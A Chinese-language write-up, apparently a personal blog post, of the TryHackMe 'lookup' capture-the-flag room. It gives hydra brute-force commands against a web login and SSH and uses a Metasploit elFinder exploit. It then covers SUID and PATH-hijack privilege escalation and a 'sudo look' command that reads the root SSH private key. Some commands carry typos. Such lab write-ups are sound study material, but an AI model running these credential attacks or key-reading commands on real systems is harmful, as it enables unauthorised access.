---
{"dg-publish":true,"permalink":"/tryhackme/tryhackme lookup-教程/","title":"lookup 教程","tags":["linux","渗透"]}
---

# lookup 教程
![lookup](/img/user/images/lookup-教程/head.png)

这次来了个lookup 话不多说 直接看题

![lookup](/img/user/images/lookup-教程/title.png)

## 第一步
我们还是绑一下域名 就是在/etc/hosts里面输你的机器ip 加lookup.thm

这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去

![file](/img/user/images/lookup-教程/fail.png)

## 第二步
我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  "/login.php:username=^USER^&password=^PASS^:Wrong Password. Please try again"

hydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV "/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
```

[[tips和一些工具/linux工具#^ea11bf\|linux工具#^ea11bf]]

通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来

![hydra](/img/user/images/lookup-教程/password.png)

![hydra](/img/user/images/lookup-教程/password2.png)

## 第三步
破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 

![lock](/img/user/images/lookup-教程/file1.png)

好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞

![lock](/img/user/images/lookup-教程/banbaen.png)

![msf](/img/user/images/lookup-教程/msf.png)

配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了

![msf](/img/user/images/lookup-教程/msf1.png)

## 第四步
这个有有点困难了 要提权 先find /--perm 4000 2>/dev/null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root 

```
find /--perm 4000 2>/dev/null 
```

>/dev/null 表示将标准错误输出重定向到 /dev/null，这相当于丢弃错误信息。


![shell](/img/user/images/lookup-教程/pwn.png)


![shell](/img/user/images/lookup-教程/pwn2.png)

输入/usr/sbin/pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名

![shell](/img/user/images/lookup-教程/id.png)

我们在/tmp中搞一个id的文本文件 id think用户 

```
echo -e '#!/bin/bash\n echo "uid=33(think) gid=33(think) groups=33(think)"' > id
```

![shell](/img/user/images/lookup-教程/think.png)

别忘了给这个id文件加上可执行的权限

```
chmod +x id
```
然后修改一下环境变量 将 /tmp 目录添加到 PATH 变量的最前面。系统在查找可执行文件时，会首先查找 /tmp 目录中的文件。

如果 /tmp 目录中有可执行文件，直接输入命令时，系统会优先在 /tmp 中寻找该命令。

![shell](/img/user/images/lookup-教程/export.png)

重新运行/usr/sbin/pwm 就能看到爆出来了一堆密码(没猜错就是密码)

![shell](/img/user/images/lookup-教程/jose1.png)

把这些复制下来 粘贴到一个文本文档中 做成一个密码本 用户名为think 用hydra爆破ssh的密码 

```
hydra -l think -P /path/你的密码本文件名 ssh://lookup.thm
```

![shell](/img/user/images/lookup-教程/mima.png)

[[tips和一些工具/linux工具#^d8a8c8\|linux工具#^d8a8c8]]
用这个用户名和密码就能成功ssh连接上think这个用户 然后直接ls就能查看到user.txt

![mima](/img/user/images/lookup-教程/user.png)

成功爆破 还有一个root用户还没解决 我们sudo -l查看能运行什么命令 有个look 我们到这里[GTFOBins](https://gtfobins.github.io/gtfobins/) 搜索look 

![mima](/img/user/images/lookup-教程/sudo.png)

这也是个漏洞 让他爆出root的秘钥

![mima](/img/user/images/lookup-教程/look2.png)

```
LFILE = /root/.ssh/id_rsa 

sudo look ''  “ $LFILE ”
```

![mima](/img/user/images/lookup-教程/look.png)

最后把 秘钥粘贴到一个文本文件中  成功登录 ls就能看到root.txt 第二问解决

```
ssh -i 文件名 root@lookup.thm
```

![mima](/img/user/images/lookup-教程/ssh.png)

![mima](/img/user/images/lookup-教程/root.png)

lookup只能说很细节 用了msf hydra 提权 提权还是不懂 我都是网站找的python的搞 这个纯纯弱项了 还有hydra也折腾了好久 本来是rockyou.txt一直梭 但一直不出 换了好几个用户名的字典 才把用户名搞出来
要破解网站要加这个"username=^USER^&password=^PASS^:网页输错的提示"一开始是很不理解为啥这样的 这个网站一个是密码和用户名全错 一个是用户名错 就用这个提示把密码筛选出来 然后用密码破用户名 学的东西还挺多的
